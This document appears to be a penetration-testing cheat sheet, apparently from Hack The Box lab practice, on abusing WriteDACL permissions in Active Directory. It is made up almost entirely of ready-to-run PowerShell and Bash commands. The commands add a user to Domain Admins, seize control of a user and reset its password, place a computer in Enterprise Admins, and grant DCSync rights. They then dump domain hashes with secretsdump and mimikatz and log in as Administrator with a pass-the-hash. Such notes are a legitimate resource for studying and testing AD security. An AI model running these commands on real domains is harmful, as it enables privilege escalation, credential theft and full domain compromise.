With write access to the target object’s DACL (Discretionary Access Control List) , you can grant yourself any privilege you want on the object.

#### **1. Groups: Add a Member to a Group**

**Scenario:**  
You have `WriteDACL` over a group (e.g., "Domain Admins"). Use it to grant yourself the ability to add members.

**Steps:**

1. **Import PowerView**  
   Import the PowerView module to enable Active Directory manipulation:
   ```powershell
   import-module .\powerview.ps1
   ```

2. **Set Up Credentials**  
   Create a secure credential object for the user with `WriteDACL` privileges:
   ```powershell
   $pass = convertto-securestring 'abc123!' -asplain -force
   $cred = new-object system.management.automation.pscredential('htb\MG', $pass)
   ```

3. **Modify DACL to Grant WriteMembers**  
   Use `Add-DomainObjectAcl` to allow your account to add members to the target group:
   ```powershell
   Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers -PrincipalIdentity MG -Credential $cred
   ```
   - **Why:** This modifies the DACL of the group to give the `MG` user permission to manage its membership.

4. **Add a New Member to the Group**  
   Once the DACL is modified, add a user (e.g., `NewUser`) to the group:
   ```powershell
   net user NewUser SecurePass123! /add /domain
   net group "Domain Admins" NewUser /add /domain
   ```

---

#### **2. Users: Gain Full Control Over a User**

**Scenario:**  
You have `WriteDACL` over a user. Use it to grant full control of the user object.

**Steps:**

1. **Import PowerView**  
   ```powershell
   import-module .\powerview.ps1
   ```

2. **Set Up Credentials**  
   ```powershell
   $pass = convertto-securestring 'abc123!' -asplain -force
   $cred = new-object system.management.automation.pscredential('htb\MG', $pass)
   ```

3. **Modify DACL to Grant Full Control**  
   Grant full control over the target user (e.g., `victimUser`):
   ```powershell
   Add-DomainObjectAcl -TargetIdentity victimUser -Rights All -PrincipalIdentity MG -Credential $cred
   ```
   - **Why:** This allows you to modify any attribute or permissions of the target user.

4. **Reset the User’s Password**  
   After gaining control, reset the user’s password:
   ```powershell
   Set-ADAccountPassword -Identity victimUser -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
   ```

---

#### **3. Computers: Gain Full Control Over a Computer Object**

**Scenario:**  
You have `WriteDACL` over a computer object. Use it to grant full control.

**Steps:**

1. **Import PowerView**  
   ```powershell
   import-module .\powerview.ps1
   ```

2. **Set Up Credentials**  
   ```powershell
   $pass = convertto-securestring 'abc123!' -asplain -force
   $cred = new-object system.management.automation.pscredential('htb\MG', $pass)
   ```

3. **Modify DACL to Grant Full Control**  
   Grant full control over the target computer (e.g., `comp01`):
   ```powershell
   Add-DomainObjectAcl -TargetIdentity comp01 -Rights All -PrincipalIdentity MG -Credential $cred
   ```
   - **Why:** This allows modification of computer attributes or other interactions.

4. **Add the Computer to Another Group**  
   Add the computer object to a privileged group, such as "Enterprise Admins":
   ```powershell
   Add-ADGroupMember -Identity "Enterprise Admins" -Members comp01$
   ```

---

#### **4. Domains: Perform a DCSync Attack**

**Scenario:**  
You have `WriteDACL` on the domain object. Use it to grant yourself `DCSync` rights.
![Pasted image 20250501172244](https://github.com/user-attachments/assets/2161dfe3-908e-4c76-b72a-82c412583f84)
We owned SVC account and we are member of `Exchange Windows Permissions` that has a `WriteDacl` ACL on on the Domain.
Steps (On target Powershell)
**Steps:**

1. **Import PowerView**  
   ```powershell
   import-module .\powerview.ps1
   ```

2. **Set Up Credentials**  
   ```powershell
   $pass = convertto-securestring 'abc123!' -asplain -force
   $cred = new-object system.management.automation.pscredential('htb\MG', $pass)
   ```

3. **Modify DACL to Grant DCSync Rights**  
   Use `Add-DomainObjectAcl` to grant your account the `DCSync` privilege:
   ```powershell
   Add-DomainObjectAcl -TargetIdentity "testlab.local" -Rights DCSync -PrincipalIdentity MG -Credential $cred
   ```
   - **Why:** This enables your account to request replication data, including password hashes, from the domain.

4. **Perform the DCSync Attack**  
### Extract Secrets and Access Administrator

1. **Dump Secrets Using the New User**  
   Use `impacket-secretsdump` to extract secrets from the domain:
   ```bash
   impacket-secretsdump htb/MG@$IP
   ```

2. **Use the Administrator Hash to Gain Access**  
   Use `evil-winrm` to log in as `Administrator` with the extracted hash:
   ```bash
   evil-winrm -i $IP -u Administrator -H "32693b11e6aa90eb43d32c72a07ceea6"
   ```

---

This sequence shows how to extract secrets using your new account (`MG`) and leverage the extracted `Administrator` hash for privileged access.
   Or
   Use Mimikatz or similar tools to execute the DCSync attack:
   ```powershell
   mimikatz # lsadump::dcsync /user:krbtgt
   ```
